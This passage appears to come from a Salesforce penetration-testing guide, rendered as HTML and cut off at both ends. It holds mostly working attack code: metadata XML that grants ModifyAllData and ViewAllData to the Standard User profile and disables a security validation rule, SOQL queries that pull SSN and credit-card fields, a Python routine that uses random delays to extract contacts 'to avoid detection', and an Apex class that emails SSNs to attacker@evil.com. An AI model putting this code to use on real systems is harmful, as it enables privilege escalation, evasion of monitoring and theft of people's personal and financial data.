</span><span id="__span-69-11"><a id="__codelineno-69-11" name="__codelineno-69-11" href="#__codelineno-69-11"></a><span class="w">            </span><span class="nt">&lt;met:queries&gt;</span>
</span><span id="__span-69-12"><a id="__codelineno-69-12" name="__codelineno-69-12" href="#__codelineno-69-12"></a><span class="w">                </span><span class="nt">&lt;met:type&gt;</span>Profile<span class="nt">&lt;/met:type&gt;</span>
</span><span id="__span-69-13"><a id="__codelineno-69-13" name="__codelineno-69-13" href="#__codelineno-69-13"></a><span class="w">            </span><span class="nt">&lt;/met:queries&gt;</span>
</span><span id="__span-69-14"><a id="__codelineno-69-14" name="__codelineno-69-14" href="#__codelineno-69-14"></a><span class="w">            </span><span class="nt">&lt;met:asOfVersion&gt;</span>52.0<span class="nt">&lt;/met:asOfVersion&gt;</span>
</span><span id="__span-69-15"><a id="__codelineno-69-15" name="__codelineno-69-15" href="#__codelineno-69-15"></a><span class="w">        </span><span class="nt">&lt;/met:listMetadata&gt;</span>
</span><span id="__span-69-16"><a id="__codelineno-69-16" name="__codelineno-69-16" href="#__codelineno-69-16"></a><span class="w">    </span><span class="nt">&lt;/soapenv:Body&gt;</span>
</span><span id="__span-69-17"><a id="__codelineno-69-17" name="__codelineno-69-17" href="#__codelineno-69-17"></a><span class="nt">&lt;/soapenv:Envelope&gt;</span>
</span></code></pre></div></p>
<p><strong>Security Control Bypass Attempts</strong>:
<div class="language-xml highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a><span class="cm">&lt;!-- Attempt to modify profile permissions --&gt;</span>
</span><span id="__span-70-2"><a id="__codelineno-70-2" name="__codelineno-70-2" href="#__codelineno-70-2"></a><span class="nt">&lt;Profile</span><span class="w"> </span><span class="na">xmlns=</span><span class="s">&quot;http://soap.sforce.com/2006/04/metadata&quot;</span><span class="nt">&gt;</span>
</span><span id="__span-70-3"><a id="__codelineno-70-3" name="__codelineno-70-3" href="#__codelineno-70-3"></a><span class="w">    </span><span class="nt">&lt;fullName&gt;</span>Standard<span class="w"> </span>User<span class="nt">&lt;/fullName&gt;</span>
</span><span id="__span-70-4"><a id="__codelineno-70-4" name="__codelineno-70-4" href="#__codelineno-70-4"></a><span class="w">    </span><span class="nt">&lt;userPermissions&gt;</span>
</span><span id="__span-70-5"><a id="__codelineno-70-5" name="__codelineno-70-5" href="#__codelineno-70-5"></a><span class="w">        </span><span class="nt">&lt;enabled&gt;</span>true<span class="nt">&lt;/enabled&gt;</span>
</span><span id="__span-70-6"><a id="__codelineno-70-6" name="__codelineno-70-6" href="#__codelineno-70-6"></a><span class="w">        </span><span class="nt">&lt;name&gt;</span>ModifyAllData<span class="nt">&lt;/name&gt;</span>
</span><span id="__span-70-7"><a id="__codelineno-70-7" name="__codelineno-70-7" href="#__codelineno-70-7"></a><span class="w">    </span><span class="nt">&lt;/userPermissions&gt;</span>
</span><span id="__span-70-8"><a id="__codelineno-70-8" name="__codelineno-70-8" href="#__codelineno-70-8"></a><span class="w">    </span><span class="nt">&lt;userPermissions&gt;</span>
</span><span id="__span-70-9"><a id="__codelineno-70-9" name="__codelineno-70-9" href="#__codelineno-70-9"></a><span class="w">        </span><span class="nt">&lt;enabled&gt;</span>true<span class="nt">&lt;/enabled&gt;</span>
</span><span id="__span-70-10"><a id="__codelineno-70-10" name="__codelineno-70-10" href="#__codelineno-70-10"></a><span class="w">        </span><span class="nt">&lt;name&gt;</span>ViewAllData<span class="nt">&lt;/name&gt;</span>
</span><span id="__span-70-11"><a id="__codelineno-70-11" name="__codelineno-70-11" href="#__codelineno-70-11"></a><span class="w">    </span><span class="nt">&lt;/userPermissions&gt;</span>
</span><span id="__span-70-12"><a id="__codelineno-70-12" name="__codelineno-70-12" href="#__codelineno-70-12"></a><span class="nt">&lt;/Profile&gt;</span>
</span><span id="__span-70-13"><a id="__codelineno-70-13" name="__codelineno-70-13" href="#__codelineno-70-13"></a>
</span><span id="__span-70-14"><a id="__codelineno-70-14" name="__codelineno-70-14" href="#__codelineno-70-14"></a><span class="cm">&lt;!-- Disable security validation rules --&gt;</span>
</span><span id="__span-70-15"><a id="__codelineno-70-15" name="__codelineno-70-15" href="#__codelineno-70-15"></a><span class="nt">&lt;ValidationRule</span><span class="w"> </span><span class="na">xmlns=</span><span class="s">&quot;http://soap.sforce.com/2006/04/metadata&quot;</span><span class="nt">&gt;</span>
</span><span id="__span-70-16"><a id="__codelineno-70-16" name="__codelineno-70-16" href="#__codelineno-70-16"></a><span class="w">    </span><span class="nt">&lt;fullName&gt;</span>Security_Validation_Rule<span class="nt">&lt;/fullName&gt;</span>
</span><span id="__span-70-17"><a id="__codelineno-70-17" name="__codelineno-70-17" href="#__codelineno-70-17"></a><span class="w">    </span><span class="nt">&lt;active&gt;</span>false<span class="nt">&lt;/active&gt;</span>
</span><span id="__span-70-18"><a id="__codelineno-70-18" name="__codelineno-70-18" href="#__codelineno-70-18"></a><span class="w">    </span><span class="nt">&lt;errorConditionFormula&gt;</span>false<span class="nt">&lt;/errorConditionFormula&gt;</span>
</span><span id="__span-70-19"><a id="__codelineno-70-19" name="__codelineno-70-19" href="#__codelineno-70-19"></a><span class="w">    </span><span class="nt">&lt;errorMessage&gt;</span>Bypassed<span class="w"> </span>security<span class="w"> </span>validation<span class="nt">&lt;/errorMessage&gt;</span>
</span><span id="__span-70-20"><a id="__codelineno-70-20" name="__codelineno-70-20" href="#__codelineno-70-20"></a><span class="nt">&lt;/ValidationRule&gt;</span>
</span></code></pre></div></p>
<p><strong>Metadata Deployment Testing</strong>:
<div class="language-python highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">test_metadata_deployment</span><span class="p">(</span><span class="n">session_id</span><span class="p">,</span> <span class="n">instance_url</span><span class="p">,</span> <span class="n">metadata_xml</span><span class="p">):</span>
</span><span id="__span-71-2"><a id="__codelineno-71-2" name="__codelineno-71-2" href="#__codelineno-71-2"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot;Test metadata deployment capabilities&quot;&quot;&quot;</span>
</span><span id="__span-71-3"><a id="__codelineno-71-3" name="__codelineno-71-3" href="#__codelineno-71-3"></a>    <span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>
</span><span id="__span-71-4"><a id="__codelineno-71-4" name="__codelineno-71-4" href="#__codelineno-71-4"></a>
</span><span id="__span-71-5"><a id="__codelineno-71-5" name="__codelineno-71-5" href="#__codelineno-71-5"></a>    <span class="n">encoded_metadata</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">metadata_xml</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span><span id="__span-71-6"><a id="__codelineno-71-6" name="__codelineno-71-6" href="#__codelineno-71-6"></a>
</span><span id="__span-71-7"><a id="__codelineno-71-7" name="__codelineno-71-7" href="#__codelineno-71-7"></a>    <span class="n">deployment_xml</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
</span><span id="__span-71-8"><a id="__codelineno-71-8" name="__codelineno-71-8" href="#__codelineno-71-8"></a><span class="s2">    &lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; </span>
</span><span id="__span-71-9"><a id="__codelineno-71-9" name="__codelineno-71-9" href="#__codelineno-71-9"></a><span class="s2">                      xmlns:met=&quot;http://soap.sforce.com/2006/04/metadata&quot;&gt;</span>
</span><span id="__span-71-10"><a id="__codelineno-71-10" name="__codelineno-71-10" href="#__codelineno-71-10"></a><span class="s2">        &lt;soapenv:Header&gt;</span>
</span><span id="__span-71-11"><a id="__codelineno-71-11" name="__codelineno-71-11" href="#__codelineno-71-11"></a><span class="s2">            &lt;met:SessionHeader&gt;</span>
</span><span id="__span-71-12"><a id="__codelineno-71-12" name="__codelineno-71-12" href="#__codelineno-71-12"></a><span class="s2">                &lt;met:sessionId&gt;</span><span class="si">{</span><span class="n">session_id</span><span class="si">}</span><span class="s2">&lt;/met:sessionId&gt;</span>
</span><span id="__span-71-13"><a id="__codelineno-71-13" name="__codelineno-71-13" href="#__codelineno-71-13"></a><span class="s2">            &lt;/met:SessionHeader&gt;</span>
</span><span id="__span-71-14"><a id="__codelineno-71-14" name="__codelineno-71-14" href="#__codelineno-71-14"></a><span class="s2">        &lt;/soapenv:Header&gt;</span>
</span><span id="__span-71-15"><a id="__codelineno-71-15" name="__codelineno-71-15" href="#__codelineno-71-15"></a><span class="s2">        &lt;soapenv:Body&gt;</span>
</span><span id="__span-71-16"><a id="__codelineno-71-16" name="__codelineno-71-16" href="#__codelineno-71-16"></a><span class="s2">            &lt;met:deploy&gt;</span>
</span><span id="__span-71-17"><a id="__codelineno-71-17" name="__codelineno-71-17" href="#__codelineno-71-17"></a><span class="s2">                &lt;met:ZipFile&gt;</span><span class="si">{</span><span class="n">encoded_metadata</span><span class="si">}</span><span class="s2">&lt;/met:ZipFile&gt;</span>
</span><span id="__span-71-18"><a id="__codelineno-71-18" name="__codelineno-71-18" href="#__codelineno-71-18"></a><span class="s2">                &lt;met:DeployOptions&gt;</span>
</span><span id="__span-71-19"><a id="__codelineno-71-19" name="__codelineno-71-19" href="#__codelineno-71-19"></a><span class="s2">                    &lt;met:allowMissingFiles&gt;false&lt;/met:allowMissingFiles&gt;</span>
</span><span id="__span-71-20"><a id="__codelineno-71-20" name="__codelineno-71-20" href="#__codelineno-71-20"></a><span class="s2">                    &lt;met:autoUpdatePackage&gt;false&lt;/met:autoUpdatePackage&gt;</span>
</span><span id="__span-71-21"><a id="__codelineno-71-21" name="__codelineno-71-21" href="#__codelineno-71-21"></a><span class="s2">                    &lt;met:checkOnly&gt;true&lt;/met:checkOnly&gt;</span>
</span><span id="__span-71-22"><a id="__codelineno-71-22" name="__codelineno-71-22" href="#__codelineno-71-22"></a><span class="s2">                    &lt;met:ignoreWarnings&gt;false&lt;/met:ignoreWarnings&gt;</span>
</span><span id="__span-71-23"><a id="__codelineno-71-23" name="__codelineno-71-23" href="#__codelineno-71-23"></a><span class="s2">                    &lt;met:performRetrieve&gt;false&lt;/met:performRetrieve&gt;</span>
</span><span id="__span-71-24"><a id="__codelineno-71-24" name="__codelineno-71-24" href="#__codelineno-71-24"></a><span class="s2">                    &lt;met:rollbackOnError&gt;true&lt;/met:rollbackOnError&gt;</span>
</span><span id="__span-71-25"><a id="__codelineno-71-25" name="__codelineno-71-25" href="#__codelineno-71-25"></a><span class="s2">                    &lt;met:singlePackage&gt;true&lt;/met:singlePackage&gt;</span>
</span><span id="__span-71-26"><a id="__codelineno-71-26" name="__codelineno-71-26" href="#__codelineno-71-26"></a><span class="s2">                &lt;/met:DeployOptions&gt;</span>
</span><span id="__span-71-27"><a id="__codelineno-71-27" name="__codelineno-71-27" href="#__codelineno-71-27"></a><span class="s2">            &lt;/met:deploy&gt;</span>
</span><span id="__span-71-28"><a id="__codelineno-71-28" name="__codelineno-71-28" href="#__codelineno-71-28"></a><span class="s2">        &lt;/soapenv:Body&gt;</span>
</span><span id="__span-71-29"><a id="__codelineno-71-29" name="__codelineno-71-29" href="#__codelineno-71-29"></a><span class="s2">    &lt;/soapenv:Envelope&gt;&quot;&quot;&quot;</span>
</span><span id="__span-71-30"><a id="__codelineno-71-30" name="__codelineno-71-30" href="#__codelineno-71-30"></a>
</span><span id="__span-71-31"><a id="__codelineno-71-31" name="__codelineno-71-31" href="#__codelineno-71-31"></a>    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
</span><span id="__span-71-32"><a id="__codelineno-71-32" name="__codelineno-71-32" href="#__codelineno-71-32"></a>        <span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s1">&#39;text/xml; charset=UTF-8&#39;</span><span class="p">,</span>
</span><span id="__span-71-33"><a id="__codelineno-71-33" name="__codelineno-71-33" href="#__codelineno-71-33"></a>        <span class="s1">&#39;SOAPAction&#39;</span><span class="p">:</span> <span class="s1">&#39;deploy&#39;</span>
</span><span id="__span-71-34"><a id="__codelineno-71-34" name="__codelineno-71-34" href="#__codelineno-71-34"></a>    <span class="p">}</span>
</span><span id="__span-71-35"><a id="__codelineno-71-35" name="__codelineno-71-35" href="#__codelineno-71-35"></a>
</span><span id="__span-71-36"><a id="__codelineno-71-36" name="__codelineno-71-36" href="#__codelineno-71-36"></a>    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
</span><span id="__span-71-37"><a id="__codelineno-71-37" name="__codelineno-71-37" href="#__codelineno-71-37"></a>        <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">instance_url</span><span class="si">}</span><span class="s2">/services/Soap/m/52.0&quot;</span><span class="p">,</span>
</span><span id="__span-71-38"><a id="__codelineno-71-38" name="__codelineno-71-38" href="#__codelineno-71-38"></a>        <span class="n">data</span><span class="o">=</span><span class="n">deployment_xml</span><span class="p">,</span>
</span><span id="__span-71-39"><a id="__codelineno-71-39" name="__codelineno-71-39" href="#__codelineno-71-39"></a>        <span class="n">headers</span><span class="o">=</span><span class="n">headers</span>
</span><span id="__span-71-40"><a id="__codelineno-71-40" name="__codelineno-71-40" href="#__codelineno-71-40"></a>    <span class="p">)</span>
</span><span id="__span-71-41"><a id="__codelineno-71-41" name="__codelineno-71-41" href="#__codelineno-71-41"></a>
</span><span id="__span-71-42"><a id="__codelineno-71-42" name="__codelineno-71-42" href="#__codelineno-71-42"></a>    <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
</span><span id="__span-71-43"><a id="__codelineno-71-43" name="__codelineno-71-43" href="#__codelineno-71-43"></a>        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Metadata deployment test completed&quot;</span><span class="p">)</span>
</span><span id="__span-71-44"><a id="__codelineno-71-44" name="__codelineno-71-44" href="#__codelineno-71-44"></a>        <span class="k">return</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span>
</span><span id="__span-71-45"><a id="__codelineno-71-45" name="__codelineno-71-45" href="#__codelineno-71-45"></a>    <span class="k">else</span><span class="p">:</span>
</span><span id="__span-71-46"><a id="__codelineno-71-46" name="__codelineno-71-46" href="#__codelineno-71-46"></a>        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Metadata deployment failed: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</span><span id="__span-71-47"><a id="__codelineno-71-47" name="__codelineno-71-47" href="#__codelineno-71-47"></a>        <span class="k">return</span> <span class="kc">None</span>
</span></code></pre></div></p>
<p><strong>Impact</strong>: Security control bypass, unauthorized configuration changes.</p>
<hr />
<h2 id="post-exploitation-persistence">Post-Exploitation &amp; Persistence</h2>
<h3 id="1-data-exfiltration-techniques">1. Data Exfiltration Techniques</h3>
<p><strong>Objective</strong>: Methods for extracting data after gaining unauthorized access.</p>
<p><strong>Bulk Data Extraction</strong>:
<div class="language-sql highlight"><pre><span></span><code><span id="__span-72-1"><a id="__codelineno-72-1" name="__codelineno-72-1" href="#__codelineno-72-1"></a><span class="c1">-- Comprehensive data extraction queries</span>
</span><span id="__span-72-2"><a id="__codelineno-72-2" name="__codelineno-72-2" href="#__codelineno-72-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">Email</span><span class="p">,</span><span class="w"> </span><span class="n">Phone</span><span class="p">,</span><span class="w"> </span><span class="n">SSN__c</span><span class="p">,</span><span class="w"> </span><span class="n">Credit_Card__c</span><span class="w"> </span>
</span><span id="__span-72-3"><a id="__codelineno-72-3" name="__codelineno-72-3" href="#__codelineno-72-3"></a><span class="k">FROM</span><span class="w"> </span><span class="n">Contact</span><span class="w"> </span>
</span><span id="__span-72-4"><a id="__codelineno-72-4" name="__codelineno-72-4" href="#__codelineno-72-4"></a><span class="k">LIMIT</span><span class="w"> </span><span class="mi">50000</span>
</span><span id="__span-72-5"><a id="__codelineno-72-5" name="__codelineno-72-5" href="#__codelineno-72-5"></a>
</span><span id="__span-72-6"><a id="__codelineno-72-6" name="__codelineno-72-6" href="#__codelineno-72-6"></a><span class="c1">-- Incremental extraction to avoid detection</span>
</span><span id="__span-72-7"><a id="__codelineno-72-7" name="__codelineno-72-7" href="#__codelineno-72-7"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">AnnualRevenue</span><span class="p">,</span><span class="w"> </span><span class="n">LastModifiedDate</span><span class="w"> </span>
</span><span id="__span-72-8"><a id="__codelineno-72-8" name="__codelineno-72-8" href="#__codelineno-72-8"></a><span class="k">FROM</span><span class="w"> </span><span class="n">Account</span><span class="w"> </span>
</span><span id="__span-72-9"><a id="__codelineno-72-9" name="__codelineno-72-9" href="#__codelineno-72-9"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">LastModifiedDate</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">2023</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">01</span><span class="n">T00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="n">Z</span>
</span><span id="__span-72-10"><a id="__codelineno-72-10" name="__codelineno-72-10" href="#__codelineno-72-10"></a>
</span><span id="__span-72-11"><a id="__codelineno-72-11" name="__codelineno-72-11" href="#__codelineno-72-11"></a><span class="c1">-- Relationship traversal for connected data</span>
</span><span id="__span-72-12"><a id="__codelineno-72-12" name="__codelineno-72-12" href="#__codelineno-72-12"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">Email</span><span class="p">,</span><span class="w"> </span><span class="n">Phone</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">Contacts</span><span class="p">)</span><span class="w"> </span>
</span><span id="__span-72-13"><a id="__codelineno-72-13" name="__codelineno-72-13" href="#__codelineno-72-13"></a><span class="k">FROM</span><span class="w"> </span><span class="n">Account</span>
</span><span id="__span-72-14"><a id="__codelineno-72-14" name="__codelineno-72-14" href="#__codelineno-72-14"></a>
</span><span id="__span-72-15"><a id="__codelineno-72-15" name="__codelineno-72-15" href="#__codelineno-72-15"></a><span class="c1">-- Financial data extraction</span>
</span><span id="__span-72-16"><a id="__codelineno-72-16" name="__codelineno-72-16" href="#__codelineno-72-16"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">Amount</span><span class="p">,</span><span class="w"> </span><span class="n">CloseDate</span><span class="p">,</span><span class="w"> </span><span class="n">StageName</span><span class="p">,</span>
</span><span id="__span-72-17"><a id="__codelineno-72-17" name="__codelineno-72-17" href="#__codelineno-72-17"></a><span class="w">       </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">Name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">Account</span><span class="p">)</span><span class="w"> </span>
</span><span id="__span-72-18"><a id="__codelineno-72-18" name="__codelineno-72-18" href="#__codelineno-72-18"></a><span class="k">FROM</span><span class="w"> </span><span class="n">Opportunity</span><span class="w"> </span>
</span><span id="__span-72-19"><a id="__codelineno-72-19" name="__codelineno-72-19" href="#__codelineno-72-19"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">Amount</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">100000</span>
</span></code></pre></div></p>
<p><strong>Stealth Extraction Methods</strong>:
<div class="language-python highlight"><pre><span></span><code><span id="__span-73-1"><a id="__codelineno-73-1" name="__codelineno-73-1" href="#__codelineno-73-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">stealth_data_extraction</span><span class="p">(</span><span class="n">session_id</span><span class="p">,</span> <span class="n">instance_url</span><span class="p">):</span>
</span><span id="__span-73-2"><a id="__codelineno-73-2" name="__codelineno-73-2" href="#__codelineno-73-2"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot;Extract data using small, frequent queries to avoid detection&quot;&quot;&quot;</span>
</span><span id="__span-73-3"><a id="__codelineno-73-3" name="__codelineno-73-3" href="#__codelineno-73-3"></a>    <span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
</span><span id="__span-73-4"><a id="__codelineno-73-4" name="__codelineno-73-4" href="#__codelineno-73-4"></a>    <span class="kn">import</span><span class="w"> </span><span class="nn">random</span>
</span><span id="__span-73-5"><a id="__codelineno-73-5" name="__codelineno-73-5" href="#__codelineno-73-5"></a>
</span><span id="__span-73-6"><a id="__codelineno-73-6" name="__codelineno-73-6" href="#__codelineno-73-6"></a>    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;Authorization&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;Bearer </span><span class="si">{</span><span class="n">session_id</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">}</span>
</span><span id="__span-73-7"><a id="__codelineno-73-7" name="__codelineno-73-7" href="#__codelineno-73-7"></a>    <span class="n">extracted_data</span> <span class="o">=</span> <span class="p">[]</span>
</span><span id="__span-73-8"><a id="__codelineno-73-8" name="__codelineno-73-8" href="#__codelineno-73-8"></a>
</span><span id="__span-73-9"><a id="__codelineno-73-9" name="__codelineno-73-9" href="#__codelineno-73-9"></a>    <span class="c1"># Small batch sizes with random delays</span>
</span><span id="__span-73-10"><a id="__codelineno-73-10" name="__codelineno-73-10" href="#__codelineno-73-10"></a>    <span class="n">batch_size</span> <span class="o">=</span> <span class="mi">50</span>
</span><span id="__span-73-11"><a id="__codelineno-73-11" name="__codelineno-73-11" href="#__codelineno-73-11"></a>    <span class="n">delay_range</span> <span class="o">=</span> <span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">15</span><span class="p">)</span>  <span class="c1"># 5-15 seconds between requests</span>
</span><span id="__span-73-12"><a id="__codelineno-73-12" name="__codelineno-73-12" href="#__codelineno-73-12"></a>
</span><span id="__span-73-13"><a id="__codelineno-73-13" name="__codelineno-73-13" href="#__codelineno-73-13"></a>    <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span>
</span><span id="__span-73-14"><a id="__codelineno-73-14" name="__codelineno-73-14" href="#__codelineno-73-14"></a>    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span><span id="__span-73-15"><a id="__codelineno-73-15" name="__codelineno-73-15" href="#__codelineno-73-15"></a>        <span class="n">query</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;SELECT Id, Name, Email FROM Contact LIMIT </span><span class="si">{</span><span class="n">batch_size</span><span class="si">}</span><span class="s2"> OFFSET </span><span class="si">{</span><span class="n">offset</span><span class="si">}</span><span class="s2">&quot;</span>
</span><span id="__span-73-16"><a id="__codelineno-73-16" name="__codelineno-73-16" href="#__codelineno-73-16"></a>
</span><span id="__span-73-17"><a id="__codelineno-73-17" name="__codelineno-73-17" href="#__codelineno-73-17"></a>        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
</span><span id="__span-73-18"><a id="__codelineno-73-18" name="__codelineno-73-18" href="#__codelineno-73-18"></a>            <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">instance_url</span><span class="si">}</span><span class="s2">/services/data/v52.0/query&quot;</span><span class="p">,</span>
</span><span id="__span-73-19"><a id="__codelineno-73-19" name="__codelineno-73-19" href="#__codelineno-73-19"></a>            <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span>
</span><span id="__span-73-20"><a id="__codelineno-73-20" name="__codelineno-73-20" href="#__codelineno-73-20"></a>            <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;q&#39;</span><span class="p">:</span> <span class="n">query</span><span class="p">}</span>
</span><span id="__span-73-21"><a id="__codelineno-73-21" name="__codelineno-73-21" href="#__codelineno-73-21"></a>        <span class="p">)</span>
</span><span id="__span-73-22"><a id="__codelineno-73-22" name="__codelineno-73-22" href="#__codelineno-73-22"></a>
</span><span id="__span-73-23"><a id="__codelineno-73-23" name="__codelineno-73-23" href="#__codelineno-73-23"></a>        <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
</span><span id="__span-73-24"><a id="__codelineno-73-24" name="__codelineno-73-24" href="#__codelineno-73-24"></a>            <span class="n">data</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
</span><span id="__span-73-25"><a id="__codelineno-73-25" name="__codelineno-73-25" href="#__codelineno-73-25"></a>            <span class="k">if</span> <span class="ow">not</span> <span class="n">data</span><span class="p">[</span><span class="s1">&#39;records&#39;</span><span class="p">]:</span>
</span><span id="__span-73-26"><a id="__codelineno-73-26" name="__codelineno-73-26" href="#__codelineno-73-26"></a>                <span class="k">break</span>
</span><span id="__span-73-27"><a id="__codelineno-73-27" name="__codelineno-73-27" href="#__codelineno-73-27"></a>
</span><span id="__span-73-28"><a id="__codelineno-73-28" name="__codelineno-73-28" href="#__codelineno-73-28"></a>            <span class="n">extracted_data</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;records&#39;</span><span class="p">])</span>
</span><span id="__span-73-29"><a id="__codelineno-73-29" name="__codelineno-73-29" href="#__codelineno-73-29"></a>            <span class="n">offset</span> <span class="o">+=</span> <span class="n">batch_size</span>
</span><span id="__span-73-30"><a id="__codelineno-73-30" name="__codelineno-73-30" href="#__codelineno-73-30"></a>
</span><span id="__span-73-31"><a id="__codelineno-73-31" name="__codelineno-73-31" href="#__codelineno-73-31"></a>            <span class="c1"># Random delay to avoid detection</span>
</span><span id="__span-73-32"><a id="__codelineno-73-32" name="__codelineno-73-32" href="#__codelineno-73-32"></a>            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="o">*</span><span class="n">delay_range</span><span class="p">))</span>
</span><span id="__span-73-33"><a id="__codelineno-73-33" name="__codelineno-73-33" href="#__codelineno-73-33"></a>        <span class="k">else</span><span class="p">:</span>
</span><span id="__span-73-34"><a id="__codelineno-73-34" name="__codelineno-73-34" href="#__codelineno-73-34"></a>            <span class="k">break</span>
</span><span id="__span-73-35"><a id="__codelineno-73-35" name="__codelineno-73-35" href="#__codelineno-73-35"></a>
</span><span id="__span-73-36"><a id="__codelineno-73-36" name="__codelineno-73-36" href="#__codelineno-73-36"></a>    <span class="k">return</span> <span class="n">extracted_data</span>
</span></code></pre></div></p>
<p><strong>Alternative Exfiltration Channels</strong>:
<div class="language-text highlight"><pre><span></span><code><span id="__span-74-1"><a id="__codelineno-74-1" name="__codelineno-74-1" href="#__codelineno-74-1"></a>// Email-based exfiltration
</span><span id="__span-74-2"><a id="__codelineno-74-2" name="__codelineno-74-2" href="#__codelineno-74-2"></a>public class EmailExfiltration {
</span><span id="__span-74-3"><a id="__codelineno-74-3" name="__codelineno-74-3" href="#__codelineno-74-3"></a>    public static void exfiltrateViaEmail() {
</span><span id="__span-74-4"><a id="__codelineno-74-4" name="__codelineno-74-4" href="#__codelineno-74-4"></a>        List&lt;Contact&gt; sensitiveContacts = [SELECT Id, Name, Email, SSN__c FROM Contact LIMIT 100];
</span><span id="__span-74-5"><a id="__codelineno-74-5" name="__codelineno-74-5" href="#__codelineno-74-5"></a>
</span><span id="__span-74-6"><a id="__codelineno-74-6" name="__codelineno-74-6" href="#__codelineno-74-6"></a>        String csvData = &#39;Name,Email,SSN\n&#39;;
</span><span id="__span-74-7"><a id="__codelineno-74-7" name="__codelineno-74-7" href="#__codelineno-74-7"></a>        for (Contact c : sensitiveContacts) {
</span><span id="__span-74-8"><a id="__codelineno-74-8" name="__codelineno-74-8" href="#__codelineno-74-8"></a>            csvData += c.Name + &#39;,&#39; + c.Email + &#39;,&#39; + c.SSN__c + &#39;\n&#39;;
</span><span id="__span-74-9"><a id="__codelineno-74-9" name="__codelineno-74-9" href="#__codelineno-74-9"></a>        }
</span><span id="__span-74-10"><a id="__codelineno-74-10" name="__codelineno-74-10" href="#__codelineno-74-10"></a>
</span><span id="__span-74-11"><a id="__codelineno-74-11" name="__codelineno-74-11" href="#__codelineno-74-11"></a>        Messaging.SingleEmailMessage email = new Messaging.SingleEmailMessage();
</span><span id="__span-74-12"><a id="__codelineno-74-12" name="__codelineno-74-12" href="#__codelineno-74-12"></a>        email.setToAddresses(new String[]{&#39;attacker@evil.com&#39;});
</span><span id="__span-74-13"><a id="__codelineno-74-13" name="__codelineno-74-13" href="#__codelineno-74-13"></a>        email.setSubject(&#39;Data Export&#39;);
</span><span id="__span-74-14"><a id="__codelineno-74-14" name="__codelineno-74-14" href="#__codelineno-74-14"></a>        email.setPlainTextBody(csvData);
</span><span id="__span-74-15"><a id="__codelineno-74-15" name="__codelineno-74-15" href="#__codelineno-74-15"></a>
